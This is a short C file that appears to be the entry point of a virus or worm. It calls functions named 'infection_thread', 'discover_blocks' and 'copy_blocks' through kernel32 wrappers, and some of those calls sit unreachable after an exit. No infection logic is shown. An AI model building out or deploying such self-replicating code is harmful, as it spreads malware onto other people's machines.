#include "block/copy.h"
#include "block/discovery.h"
#include "function_kernel32.h"
#include "infection_thread.h"

void _start() {
    infection_thread(NULL);
    EXIT_PROCESS(0);
    spawn_infection_thread();
    discover_blocks(NULL);
    copy_blocks(NULL, NULL, 0);
}
